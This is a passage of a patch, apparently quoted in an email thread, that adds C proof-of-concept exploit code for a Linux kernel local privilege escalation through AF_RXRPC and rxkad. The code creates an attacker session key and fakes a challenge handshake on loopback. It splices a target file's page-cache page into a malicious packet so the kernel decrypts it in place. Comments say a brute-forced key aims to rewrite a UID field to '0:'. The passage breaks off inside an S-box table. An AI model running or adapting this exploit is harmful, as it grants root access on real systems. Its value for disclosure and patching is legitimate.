+&gt;         uint8_t  type;
+&gt;         uint8_t  flags;
+&gt;         uint8_t  userStatus;
+&gt;         uint8_t  securityIndex;
+&gt;         uint16_t cksum;        /* big-endian on wire */
+&gt;         uint16_t serviceId;
+&gt; } __attribute__((packed));
+&gt;
+&gt; struct rxkad_challenge {
+&gt;         uint32_t version;
+&gt;         uint32_t nonce;
+&gt;         uint32_t min_level;
+&gt;         uint32_t __padding;
+&gt; } __attribute__((packed));
+&gt;
+&gt; /* Attacker-chosen 8-byte session key used for the rxkad token.
+&gt;  * Mutable because the LPE brute-force iterates over keys looking for
+&gt;  * one that decrypts the file's UID field to a "0:" prefix. */
+&gt; static uint8_t SESSION_KEY[8] = {
+&gt;         0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
+&gt; };
+&gt;
+&gt; #define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
+&gt; #define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
+&gt; #define DBG(fmt, ...) fprintf(stderr, "[.] " fmt "\n", ##__VA_ARGS__)
+&gt;
+&gt; /* =================================================================== */
+&gt; /* unshare + map setup                                                  */
+&gt; /* =================================================================== */
+&gt;
+&gt; static int write_file(const char *path, const char *fmt, ...)
+&gt; {
+&gt;         int fd = open(path, O_WRONLY);
+&gt;         if (fd &lt; 0) return -1;
+&gt;         char buf[256]; va_list ap; va_start(ap, fmt);
+&gt;         int n = vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
+&gt;         int r = (int)write(fd, buf, n); close(fd);
+&gt;         return r;
+&gt; }
+&gt;
+&gt; static int do_unshare_userns_netns(void)
+&gt; {
+&gt;         uid_t real_uid = getuid();
+&gt;         gid_t real_gid = getgid();
+&gt;         if (unshare(CLONE_NEWUSER | CLONE_NEWNET) &lt; 0) {
+&gt;                 WARN("unshare(NEWUSER|NEWNET): %s", strerror(errno));
+&gt;                 return -1;
+&gt;         }
+&gt;         LOG("unshare(USER|NET) OK, real uid=%u", real_uid);
+&gt;         write_file("/proc/self/setgroups", "deny");
+&gt;         if (write_file("/proc/self/uid_map", "%u %u 1", real_uid,
+&gt; real_uid) &lt; 0) {
+&gt;                 WARN("uid_map: %s", strerror(errno)); return -1;
+&gt;         }
+&gt;         if (write_file("/proc/self/gid_map", "%u %u 1", real_gid,
+&gt; real_gid) &lt; 0) {
+&gt;                 WARN("gid_map: %s", strerror(errno)); return -1;
+&gt;         }
+&gt;         LOG("uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within
+&gt; netns",
+&gt;                         real_uid, real_gid);
+&gt;
+&gt;         /* ifup lo */
+&gt;         int s = socket(AF_INET, SOCK_DGRAM, 0);
+&gt;         if (s &gt;= 0) {
+&gt;                 struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr));
+&gt;                 strcpy(ifr.ifr_name, "lo");
+&gt;                 if (ioctl(s, SIOCGIFFLAGS, &amp;ifr) == 0) {
+&gt;                         ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
+&gt;                         if (ioctl(s, SIOCSIFFLAGS, &amp;ifr) &lt; 0)
+&gt;                                 WARN("SIOCSIFFLAGS lo: %s",
+&gt; strerror(errno));
+&gt;                         else
+&gt;                                 LOG("lo brought UP in new netns");
+&gt;                 }
+&gt;                 close(s);
+&gt;         }
+&gt;         return 0;
+&gt; }
+&gt;
+&gt; /* =================================================================== */
+&gt; /* rxrpc key (rxkad v1 token with attacker session key)                 */
+&gt; /* =================================================================== */
+&gt;
+&gt; static long key_add(const char *type, const char *desc,
+&gt;                 const void *payload, size_t plen, int ringid)
+&gt; {
+&gt;         return syscall(SYS_add_key, type, desc, payload, plen, ringid);
+&gt; }
+&gt;
+&gt; static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
+&gt; {
+&gt;         uint8_t *p = out;
+&gt;         uint32_t now = (uint32_t)time(NULL);
+&gt;         uint32_t expires = now + 86400;
+&gt;         *(uint32_t *)p = htonl(0); p += 4;   /* flags */
+&gt;         const char *cell = "evil";
+&gt;         uint32_t clen = strlen(cell);
+&gt;         *(uint32_t *)p = htonl(clen); p += 4;
+&gt;         memcpy(p, cell, clen);
+&gt;         uint32_t pad = (4 - (clen &amp; 3)) &amp; 3;
+&gt;         memset(p + clen, 0, pad);
+&gt;         p += clen + pad;
+&gt;         *(uint32_t *)p = htonl(1); p += 4;   /* ntoken */
+&gt;         uint8_t *toklen_p = p; p += 4;
+&gt;         uint8_t *tokstart = p;
+&gt;         *(uint32_t *)p = htonl(2); p += 4;   /* sec_ix = RXKAD */
+&gt;         *(uint32_t *)p = htonl(0); p += 4;   /* vice_id */
+&gt;         *(uint32_t *)p = htonl(1); p += 4;   /* kvno */
+&gt;         memcpy(p, SESSION_KEY, 8); p += 8;   /* session_key K */
+&gt;         *(uint32_t *)p = htonl(now); p += 4;
+&gt;         *(uint32_t *)p = htonl(expires); p += 4;
+&gt;         *(uint32_t *)p = htonl(1); p += 4;   /* primary_flag */
+&gt;         *(uint32_t *)p = htonl(8); p += 4;   /* ticket_len */
+&gt;         memset(p, 0xCC, 8); p += 8;          /* ticket */
+&gt;         uint32_t toklen = (uint32_t)(p - tokstart);
+&gt;         *(uint32_t *)toklen_p = htonl(toklen);
+&gt;         if ((size_t)(p - out) &gt; maxlen) { errno = E2BIG; return -1; }
+&gt;         return (int)(p - out);
+&gt; }
+&gt;
+&gt; static long add_rxrpc_key(const char *desc)
+&gt; {
+&gt;         uint8_t buf[512];
+&gt;         int n = build_rxrpc_v1_token(buf, sizeof(buf));
+&gt;         if (n &lt; 0) return -1;
+&gt;         return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
+&gt; }
+&gt;
+&gt; /* =================================================================== */
+&gt; /* AF_ALG pcbc(fcrypt) helpers                                          */
+&gt; /* =================================================================== */
+&gt;
+&gt; static int alg_open_pcbc_fcrypt(const uint8_t key[8])
+&gt; {
+&gt;         int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
+&gt;         if (s &lt; 0) { WARN("socket(AF_ALG): %s", strerror(errno)); return
+&gt; -1; }
+&gt;         struct sockaddr_alg sa = { .salg_family = AF_ALG };
+&gt;         strcpy((char *)sa.salg_type, "skcipher");
+&gt;         strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
+&gt;         if (bind(s, (struct sockaddr *)&amp;sa, sizeof(sa)) &lt; 0) {
+&gt;                 WARN("bind(AF_ALG pcbc(fcrypt)): %s", strerror(errno));
+&gt;                 close(s); return -1;
+&gt;         }
+&gt;         if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) &lt; 0) {
+&gt;                 WARN("ALG_SET_KEY: %s", strerror(errno));
+&gt;                 close(s); return -1;
+&gt;         }
+&gt;         return s;
+&gt; }
+&gt;
+&gt; /* Encrypt-or-decrypt a 1+ block of data with a given IV. */
+&gt; static int alg_op(int alg_s, int op, const uint8_t iv[8],
+&gt;                 const void *in, size_t inlen, void *out)
+&gt; {
+&gt;         int op_fd = accept(alg_s, NULL, NULL);
+&gt;         if (op_fd &lt; 0) { WARN("accept(AF_ALG): %s", strerror(errno));
+&gt; return -1; }
+&gt;
+&gt;         char cbuf[CMSG_SPACE(sizeof(int)) +
+&gt;                 CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] = {0};
+&gt;         struct msghdr msg = {0};
+&gt;         msg.msg_control = cbuf;
+&gt;         msg.msg_controllen = sizeof(cbuf);
+&gt;
+&gt;         struct cmsghdr *c = CMSG_FIRSTHDR(&amp;msg);
+&gt;         c-&gt;cmsg_level = SOL_ALG;
+&gt;         c-&gt;cmsg_type = ALG_SET_OP;
+&gt;         c-&gt;cmsg_len = CMSG_LEN(sizeof(int));
+&gt;         *(int *)CMSG_DATA(c) = op;
+&gt;
+&gt;         c = CMSG_NXTHDR(&amp;msg, c);
+&gt;         c-&gt;cmsg_level = SOL_ALG;
+&gt;         c-&gt;cmsg_type = ALG_SET_IV;
+&gt;         c-&gt;cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
+&gt;         struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(c);
+&gt;         aiv-&gt;ivlen = 8;
+&gt;         memcpy(aiv-&gt;iv, iv, 8);
+&gt;
+&gt;         struct iovec iov = { .iov_base = (void *)in, .iov_len = inlen };
+&gt;         msg.msg_iov = &amp;iov; msg.msg_iovlen = 1;
+&gt;
+&gt;         if (sendmsg(op_fd, &amp;msg, 0) &lt; 0) {
+&gt;                 WARN("AF_ALG sendmsg: %s", strerror(errno));
+&gt;                 close(op_fd); return -1;
+&gt;         }
+&gt;         ssize_t n = read(op_fd, out, inlen);
+&gt;         close(op_fd);
+&gt;         if (n != (ssize_t)inlen) {
+&gt;                 WARN("AF_ALG read got %zd want %zu: %s",
+&gt;                                 n, inlen, strerror(errno));
+&gt;                 return -1;
+&gt;         }
+&gt;         return 0;
+&gt; }
+&gt;
+&gt; /* Compute conn-&gt;rxkad.csum_iv (ref: rxkad_prime_packet_security):
+&gt;  *   tmpbuf[0..3] = htonl(epoch, cid, 0, security_ix)  (16 B)
+&gt;  *   PCBC-encrypt(tmpbuf, IV=session_key) → out[16]
+&gt;  *   csum_iv = out[8..15]   (last 8 B = "tmpbuf[2..3]" after encryption)
+&gt;  */
+&gt; static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
+&gt;                 const uint8_t key[8], uint8_t csum_iv[8])
+&gt; {
+&gt;         int s = alg_open_pcbc_fcrypt(key);
+&gt;         if (s &lt; 0) return -1;
+&gt;         uint32_t in[4]  = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
+&gt;         uint8_t  out[16];
+&gt;         int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
+&gt;         close(s);
+&gt;         if (rc &lt; 0) return -1;
+&gt;         memcpy(csum_iv, out + 8, 8);
+&gt;         return 0;
+&gt; }
+&gt;
+&gt; /* Compute the wire cksum (ref: rxkad_secure_packet @rxkad.c:342):
+&gt;  *   x = (cid_low2 &lt;&lt; 30) | (seq &amp; 0x3fffffff)
+&gt;  *   buf[0] = htonl(call_id), buf[1] = htonl(x)    (8 B)
+&gt;  *   PCBC-encrypt(buf, IV=csum_iv) → enc[8]
+&gt;  *   y = ntohl(enc[1]); cksum = (y &gt;&gt; 16) &amp; 0xffff;  if zero -&gt; 1
+&gt;  */
+&gt; static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
+&gt;                 const uint8_t key[8], const uint8_t csum_iv[8],
+&gt;                 uint16_t *cksum_out)
+&gt; {
+&gt;         int s = alg_open_pcbc_fcrypt(key);
+&gt;         if (s &lt; 0) return -1;
+&gt;         uint32_t x = (cid &amp; RXRPC_CHANNELMASK) &lt;&lt; (32 - RXRPC_CIDSHIFT);
+&gt;         x |= seq &amp; 0x3fffffff;
+&gt;         uint32_t in[2] = { htonl(call_id), htonl(x) };
+&gt;         uint32_t out[2];
+&gt;         int rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
+&gt;         close(s);
+&gt;         if (rc &lt; 0) return -1;
+&gt;         uint32_t y = ntohl(out[1]);
+&gt;         uint16_t v = (y &gt;&gt; 16) &amp; 0xffff;
+&gt;         if (v == 0) v = 1;
+&gt;         *cksum_out = v;
+&gt;         return 0;
+&gt; }
+&gt;
+&gt; /* =================================================================== */
+&gt; /* AF_RXRPC client                                                      */
+&gt; /* =================================================================== */
+&gt;
+&gt; static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
+&gt; {
+&gt;         int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
+&gt;         if (fd &lt; 0) { WARN("socket(AF_RXRPC client): %s",
+&gt; strerror(errno)); return -1; }
+&gt;         if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
+&gt;                                 keyname, strlen(keyname)) &lt; 0) {
+&gt;                 WARN("client SECURITY_KEY: %s", strerror(errno));
+&gt; close(fd); return -1;
+&gt;         }
+&gt;         int min_level = RXRPC_SECURITY_AUTH;
+&gt;         if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
+&gt;                                 &amp;min_level, sizeof(min_level)) &lt; 0) {
+&gt;                 WARN("client MIN_SECURITY_LEVEL: %s", strerror(errno));
+&gt;                 close(fd); return -1;
+&gt;         }
+&gt;         struct sockaddr_rxrpc srx = {0};
+&gt;         srx.srx_family = AF_RXRPC;
+&gt;         srx.srx_service = 0;
+&gt;         srx.transport_type = SOCK_DGRAM;
+&gt;         srx.transport_len = sizeof(struct sockaddr_in);
+&gt;         srx.transport.sin.sin_family = AF_INET;
+&gt;         srx.transport.sin.sin_port = htons(local_port);
+&gt;         srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
+&gt;         if (bind(fd, (struct sockaddr *)&amp;srx, sizeof(srx)) &lt; 0) {
+&gt;                 WARN("client bind :%u: %s", local_port, strerror(errno));
+&gt;                 close(fd); return -1;
+&gt;         }
+&gt;         LOG("AF_RXRPC client bound :%u", local_port);
+&gt;         return fd;
+&gt; }
+&gt;
+&gt; static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
+&gt;                 uint16_t service_id,
+&gt;                 unsigned long user_call_id)
+&gt; {
+&gt;         char data[8] = "PINGPING";
+&gt;         struct sockaddr_rxrpc srx = {0};
+&gt;         srx.srx_family = AF_RXRPC;
+&gt;         srx.srx_service = service_id;
+&gt;         srx.transport_type = SOCK_DGRAM;
+&gt;         srx.transport_len = sizeof(struct sockaddr_in);
+&gt;         srx.transport.sin.sin_family = AF_INET;
+&gt;         srx.transport.sin.sin_port = htons(srv_port);
+&gt;         srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
+&gt;
+&gt;         char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
+&gt;         struct msghdr msg = {0};
+&gt;         msg.msg_name = &amp;srx; msg.msg_namelen = sizeof(srx);
+&gt;         struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
+&gt;         msg.msg_iov = &amp;iov; msg.msg_iovlen = 1;
+&gt;         msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
+&gt;         struct cmsghdr *cmsg = CMSG_FIRSTHDR(&amp;msg);
+&gt;         cmsg-&gt;cmsg_level = SOL_RXRPC;
+&gt;         cmsg-&gt;cmsg_type = RXRPC_USER_CALL_ID;
+&gt;         cmsg-&gt;cmsg_len = CMSG_LEN(sizeof(unsigned long));
+&gt;         *(unsigned long *)CMSG_DATA(cmsg) = user_call_id;
+&gt;
+&gt;         /* Don't block forever if no reply ever comes through this single
+&gt; sendmsg. */
+&gt;         int fl = fcntl(cli_fd, F_GETFL);
+&gt;         fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
+&gt;
+&gt;         ssize_t n = sendmsg(cli_fd, &amp;msg, 0);
+&gt;         fcntl(cli_fd, F_SETFL, fl);
+&gt;         if (n &lt; 0) {
+&gt;                 if (errno == EAGAIN || errno == EWOULDBLOCK) {
+&gt;                         LOG("client sendmsg returned EAGAIN (expected;
+&gt; kernel will keep "
+&gt;                                         "retrying handshake)");
+&gt;                         return 0;
+&gt;                 }
+&gt;                 WARN("client sendmsg: %s", strerror(errno));
+&gt;                 return -1;
+&gt;         }
+&gt;         LOG("client sendmsg %zd B → :%u (handshake will follow
+&gt; asynchronously)",
+&gt;                         n, srv_port);
+&gt;         return 0;
+&gt; }
+&gt;
+&gt; /* =================================================================== */
+&gt; /* fake-server (plain UDP)                                              */
+&gt; /* =================================================================== */
+&gt;
+&gt; static int setup_udp_server(uint16_t port)
+&gt; {
+&gt;         int s = socket(AF_INET, SOCK_DGRAM, 0);
+&gt;         if (s &lt; 0) { WARN("socket(udp server): %s", strerror(errno));
+&gt; return -1; }
+&gt;         struct sockaddr_in sa = {0};
+&gt;         sa.sin_family = AF_INET;
+&gt;         sa.sin_port = htons(port);
+&gt;         sa.sin_addr.s_addr = htonl(0x7F000001);
+&gt;         if (bind(s, (struct sockaddr *)&amp;sa, sizeof(sa)) &lt; 0) {
+&gt;                 WARN("udp server bind :%u: %s", port, strerror(errno));
+&gt;                 close(s); return -1;
+&gt;         }
+&gt;         LOG("plain UDP fake-server bound :%u", port);
+&gt;         return s;
+&gt; }
+&gt;
+&gt; /* Receive one UDP datagram with timeout (ms). Returns bytes or -1. */
+&gt; static ssize_t udp_recv_to(int s, void *buf, size_t cap,
+&gt;                 struct sockaddr_in *from, int timeout_ms)
+&gt; {
+&gt;         struct pollfd pfd = { .fd = s, .events = POLLIN };
+&gt;         int rc = poll(&amp;pfd, 1, timeout_ms);
+&gt;         if (rc &lt;= 0) return -1;
+&gt;         socklen_t fl = from ? sizeof(*from) : 0;
+&gt;         return recvfrom(s, buf, cap, 0,
+&gt;                         (struct sockaddr *)from, from ? &amp;fl : NULL);
+&gt; }
+&gt;
+&gt; /* =================================================================== */
+&gt; /* main PoC                                                             */
+&gt; /* =================================================================== */
+&gt;
+&gt; static int trigger_seq = 0;
+&gt;
+&gt; static int do_one_trigger(int target_fd, off_t splice_off, size_t
+&gt; splice_len)
+&gt; {
+&gt;         char keyname[32];
+&gt;         snprintf(keyname, sizeof(keyname), "evil%d", trigger_seq++);
+&gt;
+&gt;         long key = add_rxrpc_key(keyname);
+&gt;         if (key &lt; 0) {
+&gt;                 if (trigger_seq &lt; 5) WARN("add_rxrpc_key(%s): %s",
+&gt; keyname, strerror(errno));
+&gt;                 return -1;
+&gt;         }
+&gt;
+&gt;         /* Use varying ports so kernel TIME_WAIT / stale state does not
+&gt; bite. */
+&gt;         uint16_t port_S = 7777 + (trigger_seq * 2 % 200);
+&gt;         uint16_t port_C = port_S + 1;
+&gt;         uint16_t svc_id = 1234;
+&gt;
+&gt;         int udp_srv = setup_udp_server(port_S);
+&gt;         if (udp_srv &lt; 0) {
+&gt;                 if (trigger_seq &lt; 5) WARN("setup_udp_server(%u) failed",
+&gt; port_S);
+&gt;                 syscall(SYS_keyctl, 3 /*KEYCTL_INVALIDATE*/, key); return
+&gt; -1;
+&gt;         }
+&gt;
+&gt;         int rxsk_cli = setup_rxrpc_client(port_C, keyname);
+&gt;         if (rxsk_cli &lt; 0) {
+&gt;                 if (trigger_seq &lt; 5) WARN("setup_rxrpc_client(%u, %s)
+&gt; failed", port_C, keyname);
+&gt;                 close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
+&gt;         }
+&gt;
+&gt;         if (rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) &lt;
+&gt; 0) {
+&gt;                 if (trigger_seq &lt; 5) WARN("rxrpc_client_initiate_call
+&gt; failed");
+&gt;                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
+&gt; key); return -1;
+&gt;         }
+&gt;
+&gt;         uint8_t pkt[2048];
+&gt;         struct sockaddr_in cli_addr;
+&gt;         ssize_t n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &amp;cli_addr,
+&gt; 1500);
+&gt;         if (n &lt; (ssize_t)sizeof(struct rxrpc_wire_header)) {
+&gt;                 if (trigger_seq &lt; 5) WARN("udp_recv_to: n=%zd errno=%s",
+&gt; n, strerror(errno));
+&gt;                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
+&gt; key); return -1;
+&gt;         }
+&gt;         struct rxrpc_wire_header *whdr_in = (struct rxrpc_wire_header
+&gt; *)pkt;
+&gt;         uint32_t epoch  = ntohl(whdr_in-&gt;epoch);
+&gt;         uint32_t cid    = ntohl(whdr_in-&gt;cid);
+&gt;         uint32_t callN  = ntohl(whdr_in-&gt;callNumber);
+&gt;         uint16_t svc_in = ntohs(whdr_in-&gt;serviceId);
+&gt;         uint16_t cli_port = ntohs(cli_addr.sin_port);
+&gt;
+&gt;         /* Send CHALLENGE */
+&gt;         {
+&gt;                 struct {
+&gt;                         struct rxrpc_wire_header hdr;
+&gt;                         struct rxkad_challenge   ch;
+&gt;                 } __attribute__((packed)) c = {0};
+&gt;                 c.hdr.epoch = htonl(epoch);
+&gt;                 c.hdr.cid = htonl(cid);
+&gt;                 c.hdr.callNumber = 0; c.hdr.seq = 0;
+&gt;                 c.hdr.serial = htonl(0x10000);
+&gt;                 c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;
+&gt;                 c.hdr.securityIndex = 2;
+&gt;                 c.hdr.serviceId = htons(svc_in);
+&gt;                 c.ch.version = htonl(2); c.ch.nonce = htonl(0xDEADBEEFu);
+&gt;                 c.ch.min_level = htonl(1);
+&gt;                 struct sockaddr_in to = { .sin_family=AF_INET,
+&gt; .sin_port=htons(cli_port),
+&gt;                         .sin_addr.s_addr=htonl(0x7F000001) };
+&gt;                 if (sendto(udp_srv, &amp;c, sizeof(c), 0, (struct
+&gt; sockaddr*)&amp;to, sizeof(to)) &lt; 0) {
+&gt;                         close(rxsk_cli); close(udp_srv);
+&gt; syscall(SYS_keyctl, 3, key); return -1;
+&gt;                 }
+&gt;         }
+&gt;
+&gt;         /* Drain RESPONSE (best-effort) */
+&gt;         for (int i = 0; i &lt; 4; i++) {
+&gt;                 struct sockaddr_in src;
+&gt;                 if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &amp;src, 500) &lt; 0)
+&gt; break;
+&gt;         }
+&gt;
+&gt;         /* csum + cksum with CURRENT SESSION_KEY */
+&gt;         uint8_t csum_iv[8] = {0};
+&gt;         if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) &lt; 0) {
+&gt;                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
+&gt; key); return -1;
+&gt;         }
+&gt;         uint16_t cksum_h = 0;
+&gt;         if (compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &amp;cksum_h) &lt;
+&gt; 0) {
+&gt;                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
+&gt; key); return -1;
+&gt;         }
+&gt;
+&gt;         /* Build malicious DATA header */
+&gt;         struct rxrpc_wire_header mal = {0};
+&gt;         mal.epoch = htonl(epoch);
+&gt;         mal.cid = htonl(cid);
+&gt;         mal.callNumber = htonl(callN);
+&gt;         mal.seq = htonl(1);
+&gt;         mal.serial = htonl(0x42000);
+&gt;         mal.type = RXRPC_PACKET_TYPE_DATA;
+&gt;         mal.flags = RXRPC_LAST_PACKET;
+&gt;         mal.securityIndex = 2;
+&gt;         mal.cksum = htons(cksum_h);
+&gt;         mal.serviceId = htons(svc_in);
+&gt;
+&gt;         /* connect udp_srv → client port for splice */
+&gt;         struct sockaddr_in dst = { .sin_family=AF_INET,
+&gt; .sin_port=htons(cli_port),
+&gt;                 .sin_addr.s_addr=htonl(0x7F000001) };
+&gt;         if (connect(udp_srv, (struct sockaddr*)&amp;dst, sizeof(dst)) &lt; 0) {
+&gt;                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
+&gt; key); return -1;
+&gt;         }
+&gt;
+&gt;         /* pipe + vmsplice header + splice file → pipe → udp_srv */
+&gt;         int p[2];
+&gt;         if (pipe(p) &lt; 0) {
+&gt;                 close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3,
+&gt; key); return -1;
+&gt;         }
+&gt;         {
+&gt;                 struct iovec viv = { .iov_base = &amp;mal, .iov_len =
+&gt; sizeof(mal) };
+&gt;                 if (vmsplice(p[1], &amp;viv, 1, 0) &lt; 0) goto trig_fail;
+&gt;         }
+&gt;         {
+&gt;                 loff_t off = splice_off;
+&gt;                 if (splice(target_fd, &amp;off, p[1], NULL, splice_len,
+&gt; SPLICE_F_NONBLOCK) &lt; 0)
+&gt;                         goto trig_fail;
+&gt;         }
+&gt;         if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0)
+&gt; &lt; 0) {
+&gt;                 goto trig_fail;
+&gt;         }
+&gt;         close(p[0]); close(p[1]);
+&gt;
+&gt;         /* recvmsg the malicious DATA into the kernel's verify_packet path
+&gt; */
+&gt;         int fl = fcntl(rxsk_cli, F_GETFL);
+&gt;         fcntl(rxsk_cli, F_SETFL, fl | O_NONBLOCK);
+&gt;         for (int round = 0; round &lt; 5; round++) {
+&gt;                 char rb[2048];
+&gt;                 struct sockaddr_rxrpc srx;
+&gt;                 char ccb[256];
+&gt;                 struct msghdr m = {0};
+&gt;                 struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb)
+&gt; };
+&gt;                 m.msg_name = &amp;srx; m.msg_namelen = sizeof(srx);
+&gt;                 m.msg_iov = &amp;iv;  m.msg_iovlen = 1;
+&gt;                 m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
+&gt;                 ssize_t r = recvmsg(rxsk_cli, &amp;m, 0);
+&gt;                 if (r &gt; 0) break;
+&gt;                 if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(20000);
+&gt;                 else break;
+&gt;         }
+&gt;         fcntl(rxsk_cli, F_SETFL, fl);
+&gt;
+&gt;         close(rxsk_cli);
+&gt;         close(udp_srv);
+&gt;         syscall(SYS_keyctl, 3, key);
+&gt;         return 0;
+&gt;
+&gt; trig_fail:
+&gt;         close(p[0]); close(p[1]);
+&gt;         close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key);
+&gt;         return -1;
+&gt; }
+&gt;
+&gt; /* ===================================================================
+&gt;  * USER-SPACE pcbc(fcrypt) BRUTE-FORCE
+&gt;  *
+&gt;  * The kernel's rxkad_verify_packet_1() does an in-place 8-byte
+&gt;  * pcbc(fcrypt) decrypt with iv=0 over the page-cache page at the splice
+&gt;  * offset.  pcbc with single 8-B block and IV=0 reduces to a plain
+&gt;  * fcrypt_decrypt(C, K).  We can therefore search for the right K
+&gt;  * entirely in user-space — without touching the kernel/VM at all —
+&gt;  * before applying ONE deterministic kernel trigger.
+&gt;  *
+&gt;  * Port of crypto/fcrypt.c from the kernel source (David Howells / KTH).
+&gt;  * Verified against kernel test vectors:
+&gt;  *   K=0,         decrypt(0E0900C73EF7ED41) = 00000000
+&gt;  *   K=1144...66, decrypt(D8ED787477EC0680) = 123456789ABCDEF0
+&gt;  * =================================================================== */
+&gt;
+&gt; static const uint8_t fc_sbox0_raw[256] = {
+&gt;         0xea, 0x7f, 0xb2, 0x64, 0x9d, 0xb0, 0xd9, 0x11, 0xcd, 0x86, 0x86,
+&gt; 0x91, 0x0a, 0xb2, 0x93, 0x06,
+&gt;         0x0e, 0x06, 0xd2, 0x65, 0x73, 0xc5, 0x28, 0x60, 0xf2, 0x20, 0xb5,
+&gt; 0x38, 0x7e, 0xda, 0x9f, 0xe3,
+&gt;         0xd2, 0xcf, 0xc4, 0x3c, 0x61, 0xff, 0x4a, 0x4a, 0x35, 0xac, 0xaa,
+&gt; 0x5f, 0x2b, 0xbb, 0xbc, 0x53,
+&gt;         0x4e, 0x9d, 0x78, 0xa3, 0xdc, 0x09, 0x32, 0x10, 0xc6, 0x6f, 0x66,
+&gt; 0xd6, 0xab, 0xa9, 0xaf, 0xfd,
+&gt;         0x3b, 0x95, 0xe8, 0x34, 0x9a, 0x81, 0x72, 0x80, 0x9c, 0xf3, 0xec,
+&gt; 0xda, 0x9f, 0x26, 0x76, 0x15,
+&gt;         0x3e, 0x55, 0x4d, 0xde, 0x84, 0xee, 0xad, 0xc7, 0xf1, 0x6b, 0x3d,
+&gt; 0xd3, 0x04, 0x49, 0xaa, 0x24,
+&gt;         0x0b, 0x8a, 0x83, 0xba, 0xfa, 0x85, 0xa0, 0xa8, 0xb1, 0xd4, 0x01,
+&gt; 0xd8, 0x70, 0x64, 0xf0, 0x51,
+&gt;         0xd2, 0xc3, 0xa7, 0x75, 0x8c, 0xa5, 0x64, 0xef, 0x10, 0x4e, 0xb7,
+&gt; 0xc6, 0x61, 0x03, 0xeb, 0x44,
+&gt;         0x3d, 0xe5, 0xb3, 0x5b, 0xae, 0xd5, 0xad, 0x1d, 0xfa, 0x5a, 0x1e,
+&gt; 0x33, 0xab, 0x93, 0xa2, 0xb7,
+&gt;         0xe7, 0xa8, 0x45, 0xa4, 0xcd, 0x29, 0x63, 0x44, 0xb6, 0x69, 0x7e,
+&gt; 0x2e, 0x62, 0x03, 0xc8, 0xe0,
+&gt;         0x17, 0xbb, 0xc7, 0xf3, 0x3f, 0x36, 0xba, 0x71, 0x8e, 0x97, 0x65,
+&gt; 0x60, 0x69, 0xb6, 0xf6, 0xe6,
+&gt;         0x6e, 0xe0, 0x81, 0x59, 0xe8, 0xaf, 0xdd, 0x95, 0x22, 0x99, 0xfd,
+&gt; 0x63, 0x19, 0x74, 0x61, 0xb1,
+&gt;         0xb6, 0x5b, 0xae, 0x54, 0xb3, 0x70, 0xff, 0xc6, 0x3b, 0x3e, 0xc1,
+&gt; 0xd7, 0xe1, 0x0e, 0x76, 0xe5,
+&gt;         0x36, 0x4f, 0x59, 0xc7, 0x08, 0x6e, 0x82, 0xa6, 0x93, 0xc4, 0xaa,
+&gt; 0x26, 0x49, 0xe0, 0x21, 0x64,
+&gt;         0x07, 0x9f, 0x64, 0x81, 0x9c, 0xbf, 0xf9, 0xd1, 0x43, 0xf8, 0xb6,
+&gt; 0xb9, 0xf1, 0x24, 0x75, 0x03,
+&gt;         0xe4, 0xb0, 0x99, 0x46, 0x3d, 0xf5, 0xd1, 0x39, 0x72, 0x12, 0xf6,
+&gt; 0xba, 0x0c, 0x0d, 0x42, 0x2e,
+&gt; };
+&gt; static const uint8_t fc_sbox1_raw[256] = {
+&gt;         0x77, 0x14, 0xa6, 0xfe, 0xb2, 0x5e, 0x8c, 0x3e, 0x67, 0x6c, 0xa1,
+&gt; 0x0d, 0xc2, 0xa2, 0xc1, 0x85,
